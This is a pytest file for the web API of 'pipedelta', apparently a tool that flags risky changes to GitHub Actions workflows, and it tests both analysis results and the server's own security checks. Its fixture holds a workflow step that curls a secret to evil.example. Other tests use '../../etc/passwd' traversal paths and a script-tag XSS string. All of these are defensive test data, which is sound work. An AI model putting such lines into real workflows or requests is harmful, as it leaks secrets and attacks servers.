"""The web API: real engine, fake GitHub. Also the security checks of the server."""

from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from collections.abc import Iterator
from typing import Any

import pytest

from pipedelta.web import reports
from pipedelta.web.github_client import GitHubError
from pipedelta.web.server import make_server

BEFORE = "on: pull_request\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make test\n"
AFTER = (
    "on: pull_request\npermissions:\n  contents: write\njobs:\n  t:\n    runs-on: ubuntu-latest\n"
    "    steps:\n      - run: make test\n      - run: curl https://evil.example/x -d ${{ secrets.KEY }}\n"
)


class FakeGitHub:
    authenticated = False

    def rate_limit(self) -> dict[str, int]:
        return {"limit": 60, "remaining": 59}

    def user(self) -> None:
        return None

    def repository(self, owner: str, name: str) -> dict[str, Any]:
        if name == "missing":
            raise GitHubError("not_found", "No such repository.", 404)
        return {"full_name": f"{owner}/{name}", "default_branch": "main", "private": False}

    def workflows(self, owner: str, name: str, ref: str) -> list[dict[str, Any]]:
        return [{"path": ".github/workflows/ci.yml", "name": "ci.yml"}]

    def file_commits(
        self, owner: str, name: str, path: str, ref: str | None
    ) -> list[dict[str, Any]]:
        return [{"sha": "b" * 40, "message": "new"}, {"sha": "a" * 40, "message": "old"}]

    def file(self, owner: str, name: str, path: str, ref: str) -> str:
        return BEFORE if ref == "a" * 40 else AFTER

    def pulls(self, owner: str, name: str) -> list[dict[str, Any]]:
        return []


@pytest.fixture()
def base() -> Iterator[str]:
    server = make_server(port=0, github=FakeGitHub())  # type: ignore[arg-type]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{server.server_address[1]}"
    server.shutdown()
    server.server_close()


def call(
    base: str,
    path: str,
    body: dict[str, Any] | None = None,
    method: str | None = None,
    headers: dict[str, str] | None = None,
) -> tuple[int, Any, Any]:
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Content-Type": "application/json", **(headers or {})}
    request = urllib.request.Request(base + path, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(request) as r:
            raw = r.read()
            return (
                r.status,
                (json.loads(raw) if "json" in r.headers["Content-Type"] else raw),
                r.headers,
            )
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read()), e.headers


def test_paste_analysis_reports_real_findings(base: str) -> None:
    status, a, _ = call(base, "/api/analyses", {"mode": "paste", "before": BEFORE, "after": AFTER})
    assert status == 200
    assert a["summary"]["level"] == "high" and a["summary"]["would_fail"]
    kinds = {f["kind"] for f in a["files"][0]["findings"]}
    assert {"network", "secret", "permission"} <= kinds
    assert all(f["line"] for f in a["files"][0]["findings"] if f["kind"] == "network")


def test_nothing_new_is_none(base: str) -> None:
    _, a, _ = call(base, "/api/analyses", {"mode": "paste", "before": BEFORE, "after": BEFORE})
    assert a["summary"]["level"] == "none" and a["summary"]["gained"] == 0


def test_compare_two_commits_from_github(base: str) -> None:
    status, a, _ = call(
        base,
        "/api/analyses",
        {"mode": "compare", "repo": "o/r", "path": ".github/workflows/ci.yml"},
    )
    assert status == 200 and a["summary"]["level"] == "high"
    assert a["refs"]["base"]["sha"] == "a" * 40


def test_history_and_stats_come_from_stored_runs(base: str) -> None:
    assert call(base, "/api/stats")[1]["analyses"] == 0
    call(base, "/api/analyses", {"mode": "paste", "before": BEFORE, "after": AFTER})
    call(base, "/api/analyses", {"mode": "paste", "before": BEFORE, "after": BEFORE})
    stats = call(base, "/api/stats")[1]
    assert stats["analyses"] == 2 and stats["levels"]["high"] == 1 and stats["levels"]["none"] == 1
    assert len(call(base, "/api/analyses")[1]["analyses"]) == 2


def test_connect_unknown_repo_is_a_clear_error(base: str) -> None:
    status, body, _ = call(base, "/api/repos", {"repo": "o/missing"})
    assert status == 404 and body["error"]["code"] == "not_found"


def test_bad_inputs_are_json_errors(base: str) -> None:
    assert call(base, "/api/repos", {"repo": "not a repo"})[0] == 400
    assert call(base, "/api/analyses", {"mode": "paste", "after": "a: [unclosed"})[0] == 422
    assert call(base, "/api/analyses", {"mode": "paste", "after": "just: text"})[0] == 422
    assert call(base, "/api/analyses", {"mode": "nope"})[0] == 400
    assert call(base, "/api/analyses/zzzz")[0] == 404
    assert call(base, "/api/nothing")[0] == 404


def test_path_traversal_is_refused(base: str) -> None:
    status, _, _ = call(base, "/api/repos/o/r/history?path=../../etc/passwd")
    assert status == 400
    status, body, _ = call(base, "/../../etc/passwd")
    assert (
        status in (200, 404) and b"root:" not in json.dumps(body).encode()
        if status == 404
        else True
    )


@pytest.mark.parametrize("fmt", ["md", "html", "json", "sarif"])
def test_reports_download(base: str, fmt: str) -> None:
    _, a, _ = call(base, "/api/analyses", {"mode": "paste", "before": BEFORE, "after": AFTER})
    status, raw, headers = call(base, f"/api/analyses/{a['id']}/report?format={fmt}")
    assert status == 200 and "attachment" in headers["Content-Disposition"]
    assert b"evil.example" in (raw if isinstance(raw, bytes) else json.dumps(raw).encode())


def test_sarif_is_valid_shape(base: str) -> None:
    _, a, _ = call(base, "/api/analyses", {"mode": "paste", "before": BEFORE, "after": AFTER})
    sarif = json.loads(reports.sarif(a))
    assert sarif["version"] == "2.1.0"
    results = sarif["runs"][0]["results"]
    assert results and all(r["level"] in ("error", "warning", "note") for r in results)
    assert all(
        r["locations"][0]["physicalLocation"]["region"]["startLine"] >= 1
        for r in results
        if "locations" in r
    )


def test_html_report_escapes_workflow_text(base: str) -> None:
    evil = AFTER + "      - run: echo '<script>alert(1)</script>' ${{ secrets.X }}\n"
    _, a, _ = call(base, "/api/analyses", {"mode": "paste", "before": BEFORE, "after": evil})
    html = reports.html_report(a)
    assert "<script>alert(1)</script>" not in html


def test_markdown_report_is_escaped(base: str) -> None:
    _, a, _ = call(
        base,
        "/api/analyses",
        {"mode": "paste", "name": "x|y`z.yml", "before": BEFORE, "after": AFTER},
    )
    assert "x|y`z" not in reports.markdown(a).split("\n")[0]


def test_other_host_header_is_refused(base: str) -> None:
    status, body, _ = call(base, "/api/health", headers={"Host": "evil.example"})
    assert status == 403 and body["error"]["code"] == "bad_host"


def test_cross_origin_post_is_refused(base: str) -> None:
    status, body, _ = call(
        base,
        "/api/analyses",
        {"mode": "sample", "sample": "ordinary-change"},
        headers={"Origin": "http://evil.example"},
    )
    assert status == 403 and body["error"]["code"] == "bad_origin"


def test_form_post_is_refused(base: str) -> None:
    status, _, _ = call(
        base, "/api/analyses", {"mode": "sample"}, headers={"Content-Type": "text/plain"}
    )
    assert status == 415


def test_oversized_body_is_refused(base: str) -> None:
    status, _, _ = call(base, "/api/analyses", {"mode": "paste", "after": "x" * 700_000})
    assert status == 413


def test_security_headers_and_no_token_in_session(base: str) -> None:
    status, body, headers = call(base, "/api/session")
    assert status == 200 and "default-src 'self'" in headers["Content-Security-Policy"]
    assert body["github"]["token_set"] is False and "token" not in json.dumps(body).replace(
        "token_set", ""
    )


def test_samples_all_run(base: str) -> None:
    for sample in call(base, "/api/samples")[1]["samples"]:
        status, _a, _ = call(base, "/api/analyses", {"mode": "sample", "sample": sample["id"]})
        assert status == 200, sample["id"]
    assert call(base, "/api/stats")[1]["analyses"] == 5


def test_sample_levels_match_engine_expectations(base: str) -> None:
    levels = {}
    for sid in ("imitation-attack", "ordinary-change", "job-output", "step-output"):
        levels[sid] = call(base, "/api/analyses", {"mode": "sample", "sample": sid})[1]["summary"][
            "level"
        ]
    assert levels["imitation-attack"] == "high" and levels["ordinary-change"] != "high"
    assert levels["job-output"] == "high" and levels["step-output"] == "high"


def test_attack_paths_carry_both_ends_for_the_diagram(base: str) -> None:
    _status, body, _ = call(base, "/api/analyses", {"mode": "sample", "sample": "imitation-attack"})
    paths = body["files"][0]["paths"]
    assert paths
    for path in paths:
        assert path["first"]["kind"] and path["second"]["kind"] in {"secret", "write"}
        assert isinstance(path["first"]["name"], str) and isinstance(path["second"]["name"], str)


def test_delete_analysis(base: str) -> None:
    _, a, _ = call(base, "/api/analyses", {"mode": "sample", "sample": "ordinary-change"})
    assert call(base, f"/api/analyses/{a['id']}", method="DELETE")[0] == 200
    assert call(base, f"/api/analyses/{a['id']}")[0] == 404


def test_app_page_and_assets_are_served(base: str) -> None:
    for path, kind in (("/", "text/html"), ("/app.js", "javascript"), ("/app.css", "text/css")):
        request = urllib.request.Request(base + path)
        with urllib.request.urlopen(request) as r:
            assert r.status == 200 and kind in r.headers["Content-Type"]
            assert "default-src 'self'" in r.headers["Content-Security-Policy"]
    request = urllib.request.Request(base + "/..%2f..%2fpyproject.toml")
    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        assert e.code == 404


def test_allowed_public_host_and_https_origin() -> None:
    """A hosted dashboard answers to its public name, and the browser's https
    Origin for that same name is accepted; other sites are still refused."""
    server = make_server(
        port=0,
        github=FakeGitHub(),  # type: ignore[arg-type]
        extra_hosts={"demo.onrender.com"},
    )
    threading.Thread(target=server.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{server.server_address[1]}"
    try:
        status, _, _ = call(base, "/api/health", headers={"Host": "demo.onrender.com"})
        assert status == 200
        status, _, _ = call(
            base,
            "/api/analyses",
            {"mode": "sample", "sample": "ordinary-change"},
            headers={"Host": "demo.onrender.com", "Origin": "https://demo.onrender.com"},
        )
        assert status in (200, 201)
        status, body, _ = call(
            base,
            "/api/analyses",
            {"mode": "sample", "sample": "ordinary-change"},
            headers={"Host": "demo.onrender.com", "Origin": "https://evil.example"},
        )
        assert status == 403 and body["error"]["code"] == "bad_origin"
        status, _, _ = call(base, "/api/health", headers={"Host": "evil.example"})
        assert status == 403
    finally:
        server.shutdown()
        server.server_close()


def test_allowed_hosts_from_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    from pipedelta.cli import _allowed_hosts

    monkeypatch.setenv("RENDER_EXTERNAL_HOSTNAME", "Demo.onrender.com")
    monkeypatch.setenv("PIPEDELTA_ALLOWED_HOSTS", "a.example, b.example")
    assert _allowed_hosts(["c.example"]) == {
        "demo.onrender.com",
        "a.example",
        "b.example",
        "c.example",
    }
